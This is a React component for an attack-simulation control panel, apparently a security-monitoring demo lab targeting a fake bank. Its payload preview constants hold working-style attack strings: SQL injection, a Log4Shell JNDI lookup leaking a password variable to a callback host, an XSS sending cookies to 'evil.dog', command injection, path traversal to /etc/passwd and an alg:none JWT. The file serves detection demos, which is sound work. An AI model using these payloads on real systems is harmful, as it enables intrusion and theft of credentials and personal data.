import React, { useMemo, useState } from 'react';
import {
  Search, Zap, AlertTriangle, Terminal as TerminalIcon, Play, Crosshair,
  ShieldAlert, Database, Bug, Code2, KeyRound, FileWarning,
} from 'lucide-react';
import { Badge, Dot, Terminal } from './parts';

const VECTOR_ICONS = {
  sqli: Database,
  log4shell: Bug,
  xss: Code2,
  'credential-stuffing': KeyRound,
  idor: FileWarning,
  rce: TerminalIcon,
  'path-traversal': FileWarning,
  'auth-bypass': KeyRound,
};

const PAYLOAD_PREVIEW = {
  sqli: "' OR 1=1; UNION SELECT nome,email,cpf,saldo,banco,chave_pix FROM usuarios--",
  log4shell: ['$', '{jndi:ldap://evildog-callback:1389/cn=', '$', '{env:SPRING_DATASOURCE_PASSWORD}}'].join(''),
  'credential-stuffing': 'cpf ∈ [CPFs reais]  ×  senha ∈ [rockyou top-100]   (60 tentativas/burst)',
  xss: "<script>fetch('https://evil.dog/'+document.cookie)</script>",
  idor: 'GET /api/accounts/{1..999}   (sem autenticação)',
  rce: '; cat /proc/self/environ  |  $(printenv DD_API_KEY)',
  'path-traversal': '../../../etc/passwd',
  'auth-bypass': 'Authorization: Bearer <alg:none JWT>',
};

const FALLBACK_VECTORS = [
  { id: 'sqli', label: 'SQL Injection', cwe: 'CWE-89', severity: 'critical' },
  { id: 'log4shell', label: 'Log4Shell (JNDI)', cwe: 'CVE-2021-44228', severity: 'critical' },
  { id: 'credential-stuffing', label: 'Credential Stuffing', cwe: 'OWASP A07', severity: 'high' },
  { id: 'xss', label: 'XSS', cwe: 'CWE-79', severity: 'medium' },
  { id: 'idor', label: 'IDOR', cwe: 'CWE-639', severity: 'high' },
  { id: 'auth-bypass', label: 'Auth Bypass', cwe: 'CWE-287', severity: 'high' },
];

const StatCard = ({ icon: Icon, label, value, color }) => {
  const c = {
    cyan: 'text-cyan-400 bg-cyan-500/10 border-cyan-500/20',
    amber: 'text-amber-400 bg-amber-500/10 border-amber-500/20',
    red: 'text-red-400 bg-red-500/10 border-red-500/20',
    green: 'text-green-400 bg-green-500/10 border-green-500/20',
  }[color];
  return (
    <div className="rounded-xl border border-[#1e2733] bg-[#0f151d] p-4 flex flex-col gap-3">
      <div className={`w-10 h-10 rounded-lg border flex items-center justify-center ${c}`}>
        <Icon className="w-5 h-5" />
      </div>
      <div>
        <div className="text-[11px] uppercase tracking-wider text-slate-500">{label}</div>
        <div className="text-3xl font-bold text-slate-100 tabular-nums mt-1">{value}</div>
      </div>
    </div>
  );
};

export default function ControlPanel({ evd }) {
  const { cards, target, vectors, feed, fireAttack, running, operationError, clearOperationError } = evd;
  const [selected, setSelected] = useState('sqli');

  const vectorList = useMemo(() => (vectors.length ? vectors : FALLBACK_VECTORS), [vectors]);
  const selMeta = useMemo(
    () => vectorList.find((v) => v.id === selected) || vectorList[0],
    [vectorList, selected],
  );
  const isRunning = running === selected;
  const cvss = target?.cvss ?? 9.8;

  return (
    <div className="space-y-5">
      {operationError && (
        <div role="alert" className="flex items-start justify-between gap-3 rounded-xl border border-orange-500/40 bg-orange-500/10 px-4 py-3 text-sm text-orange-100">
          <span><strong>{operationError.kind === 'RATE_LIMITED' ? 'Rate limit.' : operationError.kind === 'AAP_BLOCKED' ? 'AAP bloqueou a ação.' : 'Ação falhou.'}</strong>{operationError.message ? ` ${operationError.message}` : ''}</span>
          <button onClick={clearOperationError} className="text-xs opacity-70 hover:opacity-100">fechar</button>
        </div>
      )}
      {/* Welcome banner */}
      <div className="rounded-xl border border-[#1e2733] bg-gradient-to-r from-[#0f1a12] to-[#0f151d] p-5 relative overflow-hidden">
        <div className="evd-scan" />
        <h2 className="text-xl font-bold text-slate-100">Welcome back, Operator</h2>
        <p className="text-sm text-slate-400 mt-1">
          Alvo carregado. Pronto para engajar. Scripts de penetração mapeados com caminhos de execução autorizados (lab).
        </p>
      </div>

      {/* Stat cards */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        <StatCard icon={Search} label="Vulnerabilities Found" value={cards.vulnerabilities_found} color="cyan" />
        <StatCard icon={Zap} label="Exploits Executed" value={cards.exploits_executed} color="amber" />
        <StatCard icon={AlertTriangle} label="Systems Compromised" value={cards.systems_compromised} color="red" />
        <StatCard icon={TerminalIcon} label="Active Sessions" value={cards.active_sessions} color="green" />
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-3 gap-5">
        {/* Left: attack vector + exploit output */}
        <div className="xl:col-span-2 space-y-5">
          <div className="rounded-xl border border-[#1e2733] bg-[#0f151d] p-5">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <Crosshair className="w-4 h-4 text-red-400" />
                <h3 className="font-bold text-slate-100">Attack Vector — {selMeta?.label}</h3>
              </div>
              <Badge color={isRunning ? 'amber' : 'green'}>{isRunning ? 'RUNNING' : 'READY'}</Badge>
            </div>

            {/* vector selector chips */}
            <div className="flex flex-wrap gap-2 mb-4">
              {vectorList.map((v) => {
                const Icon = VECTOR_ICONS[v.id] || Bug;
                const active = v.id === selected;
                return (
                  <button
                    key={v.id}
                    onClick={() => setSelected(v.id)}
                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border text-xs transition-colors
                      ${active
                        ? 'border-red-500/50 bg-red-500/10 text-red-300'
                        : 'border-[#26313f] bg-[#131b25] text-slate-400 hover:text-slate-200 hover:border-[#33465a]'}`}
                  >
                    <Icon className="w-3.5 h-3.5" /> {v.label}
                  </button>
                );
              })}
            </div>

            <div className="rounded-lg border border-[#1e2733] bg-[#080b10] p-4">
              <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1">active_payload · {selMeta?.cwe}</div>
              <code className="block text-green-400 text-[13px] break-all">{PAYLOAD_PREVIEW[selected] || '—'}</code>
            </div>

            <div className="flex items-center justify-between mt-4">
              <p className="text-xs text-slate-500">
                * Ataque real, escopado ao lab. O Datadog AAP detecta o tráfego malicioso.
              </p>
              <button
                onClick={() => fireAttack(selected)}
                disabled={isRunning}
                className={`flex items-center gap-2 px-5 py-2.5 rounded-lg font-bold text-sm transition-all
                  ${isRunning
                    ? 'bg-red-900/40 text-red-300 cursor-wait'
                    : 'bg-red-500 hover:bg-red-400 text-white shadow-lg shadow-red-500/20'}`}
              >
                <Play className="w-4 h-4" /> {isRunning ? 'EXECUTANDO…' : 'START EXPLOIT'}
              </button>
            </div>
          </div>

          <Terminal feed={feed} />
        </div>

        {/* Right: target profile */}
        <div className="space-y-5">
          <div className="rounded-xl border border-[#1e2733] bg-[#0f151d] p-5">
            <div className="flex items-center gap-2 mb-4">
              <Crosshair className="w-4 h-4 text-red-400" />
              <h3 className="font-bold text-slate-100">Target Profile</h3>
            </div>

            <div className="space-y-3 text-sm">
              <div>
                <div className="text-[10px] uppercase tracking-widest text-slate-500">Target Address</div>
                <div className="text-slate-100 font-bold">{target?.address || 'lab.dogbank.dog'}</div>
              </div>
              <div>
                <div className="text-[10px] uppercase tracking-widest text-slate-500">Operating System</div>
                <div className="text-slate-300">{target?.os || 'Debian Linux · EKS'}</div>
              </div>
              <div>
                <div className="text-[10px] uppercase tracking-widest text-slate-500">Services Detected</div>
                <div className="text-slate-300">{(target?.services || []).join(', ') || '—'}</div>
              </div>
              <div>
                <div className="text-[10px] uppercase tracking-widest text-slate-500 mb-1.5">Open Ports</div>
                <div className="flex flex-wrap gap-1.5">
                  {(target?.open_ports || []).map((p) => (
                    <span key={p.port} className="px-2 py-1 rounded-md bg-[#131b25] border border-[#26313f] text-xs">
                      <span className="text-cyan-400 font-bold">{p.port}</span>
                      <span className="text-slate-500"> / {p.service}</span>
                    </span>
                  ))}
                </div>
              </div>
            </div>

            <div className="mt-5 rounded-lg border border-red-500/20 bg-red-500/5 p-4">
              <div className="flex items-center justify-between">
                <span className="text-[10px] uppercase tracking-widest text-slate-500">Vulnerability Level (CVSS)</span>
                <span className="text-red-400 text-sm font-bold">{target?.severity || 'CRITICAL'}</span>
              </div>
              <div className="text-5xl font-bold text-red-500 tabular-nums mt-1">{cvss.toFixed(1)}</div>
              <div className="h-2 rounded-full bg-[#131b25] mt-3 overflow-hidden">
                <div className="h-full bg-red-500 rounded-full" style={{ width: `${(cvss / 10) * 100}%` }} />
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Log4j scanner strip */}
      <div className="rounded-xl border border-amber-500/20 bg-[#0f151d] p-4 flex items-center gap-4">
        <div className="w-10 h-10 rounded-lg border border-amber-500/30 bg-amber-500/10 flex items-center justify-center">
          <ShieldAlert className="w-5 h-5 text-amber-400" />
        </div>
        <div className="flex-1">
          <div className="font-bold text-slate-100">Log4j Vulnerability Scanner</div>
          <div className="text-sm text-slate-400">Audita componentes de rede em busca de falhas de lookup JNDI/LDAP.</div>
        </div>
        <div className="flex items-center gap-2 text-[10px] uppercase tracking-widest text-slate-500 mr-2">
          <Dot color="bg-amber-500" pulse /> Pre-exploit stage
        </div>
        <button
          onClick={() => fireAttack('log4shell')}
          disabled={running === 'log4shell'}
          className="flex items-center gap-2 px-4 py-2 rounded-lg font-bold text-sm bg-amber-500 hover:bg-amber-400 text-black transition-colors disabled:opacity-60"
        >
          <Search className="w-4 h-4" /> Scan Network
        </button>
      </div>
    </div>
  );
}
